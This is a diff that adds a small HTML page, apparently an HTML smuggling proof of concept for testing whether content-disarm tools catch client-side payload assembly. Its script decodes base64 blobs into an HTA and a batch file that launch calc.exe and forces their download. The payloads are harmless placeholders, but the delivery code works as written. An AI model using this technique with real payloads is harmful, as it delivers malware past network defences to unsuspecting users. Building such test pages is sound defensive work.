@@ -1,0 +1,25 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Island / OPSwat - HTML smuggling PoC</title></head>
+<body style="font-family:sans-serif;max-width:720px;margin:40px auto">
+<h2>HTML smuggling test (benign calc.exe PoC)</h2>
+<p>The browser cannot launch calc.exe directly from JavaScript - it is sandboxed.
+The risk is <b>smuggling</b>: the page rebuilds a payload from a base64 blob entirely
+client-side and forces a download, so the malicious bytes never traverse the network
+and are invisible to inline/proxy CDR. On a Windows host, double-clicking the dropped
+file runs calc.exe.</p>
+<button onclick="drop('hta')">Download calc_poc.hta</button>
+<button onclick="drop('bat')">Download calc_poc.bat</button>
+<pre id="log"></pre>
+<script>
+var P={hta:{d:"SFRBOkFQUExJQ0FUSU9ODQo8c2NyaXB0Pm5ldyBBY3RpdmVYT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUnVuKCJjYWxjLmV4ZSIpO3dpbmRvdy5jbG9zZSgpOzwvc2NyaXB0Pg==",n:"calc_poc.hta",t:"application/hta"},
+       bat:{d:"QGVjaG8gb2ZmDQpzdGFydCBjYWxjLmV4ZQ0K",n:"calc_poc.bat",t:"application/bat"}};
+function drop(k){
+  var p=P[k], bin=atob(p.d), a=new Uint8Array(bin.length);
+  for(var i=0;i<bin.length;i++)a[i]=bin.charCodeAt(i);
+  var url=URL.createObjectURL(new Blob([a],{type:p.t}));
+  var el=document.createElement('a'); el.href=url; el.download=p.n;
+  document.body.appendChild(el); el.click(); el.remove();
+  document.getElementById('log').textContent+="assembled+dropped "+p.n+" ("+a.length+" bytes)\n";
+}
+</script>
+</body></html>
